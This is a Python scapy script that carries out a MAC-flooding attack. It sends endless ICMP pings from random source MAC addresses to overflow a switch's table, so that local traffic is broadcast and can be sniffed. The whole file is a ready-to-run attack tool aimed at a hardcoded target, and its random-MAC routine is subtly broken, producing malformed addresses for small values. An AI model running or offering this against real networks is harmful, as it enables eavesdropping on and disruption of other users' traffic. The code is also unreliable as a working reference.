'''
	This script constantly PING a host with a random MAC address, filling up the switch's switch table.
	Once fulled, the switch will remove older items from the switch table, keeping newer ones.
	Without a corresponding item from the table, a message sent by a normal host from your local network
	has to be broadcasted through the entire network, that's how a switch normally work.
'''
from scapy.all import *
import random

ip = "10.1.40.7"
iface = "以太网"


def switchoverflow(ip):
    def get_random_mac():
        # generate a random MAC address
        mac = []
        for i in range(0, 6):
            mac.append(hex(random.randint(0, 256))[-2:])
        return ':'.join(mac)

    while True:
        try:
            mac = get_random_mac()
            print("[*] PING {} using {}".format(ip, mac))
            # create an ICMP echo request packet
            packet = Ether(src=mac) / IP(dst=ip) / ICMP()
            sendp(packet, verbose=0, iface=iface)
        except KeyboardInterrupt:
            exit(0)
        except:
            pass


switchoverflow(ip)
